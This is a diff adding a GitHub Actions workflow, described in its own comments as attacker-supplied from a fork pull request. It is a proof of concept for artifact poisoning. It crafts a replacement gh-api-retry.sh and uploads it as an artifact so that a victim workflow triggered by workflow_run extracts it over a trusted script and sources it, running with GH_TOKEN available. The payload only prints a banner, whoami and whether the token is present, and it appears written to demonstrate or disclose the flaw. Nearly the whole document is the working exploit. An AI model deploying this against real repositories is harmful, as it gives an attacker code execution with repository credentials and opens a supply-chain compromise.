@@ -1,0 +1,49 @@
+# Attacker-supplied workflow, added in a FORK PR.
+# `name:` must match the victim's `workflow_run: workflows: [...]` trigger.
+name: Linux Build using GCC
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions: {}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      PR: ${{ github.event.pull_request.number }}
+    steps:
+      - name: Craft poisoned selective-build-comment artifact
+        run: |
+          mkdir -p .github/scripts
+          # unquoted heredoc: ${PR} is baked in now, \${GH_TOKEN} stays literal
+          cat > .github/scripts/gh-api-retry.sh <<SH
+          echo "=================================================="
+          echo " ARTIFACT POISONING PROVEN"
+          echo " attacker shell code executing via 'source'"
+          echo " GH_TOKEN present in this shell: \${GH_TOKEN:+yes}"
+          echo " user=\$(whoami) cwd=\$(pwd)"
+          echo "=================================================="
+          gh_api() { echo "${PR}"; }
+          SH
+          cat > comment.md <<'MD'
+          **PoC — artifact poisoning in `selective-build-comment.yml`.**
+
+          This comment body came from an attacker-controlled artifact, and the step that
+          produced it executed attacker shell code `source`d from
+          `.github/scripts/gh-api-retry.sh`. The download step specifies no `path:`, so
+          the artifact extracted into `$GITHUB_WORKSPACE` and replaced that file in the
+          trusted sparse checkout before it was sourced.
+          MD
+          echo "--- payload ---"; cat .github/scripts/gh-api-retry.sh
+
+      - name: Upload poisoned artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: selective-build-comment
+          path: |
+            .github/scripts/gh-api-retry.sh
+            comment.md
+          include-hidden-files: true
+          retention-days: 30
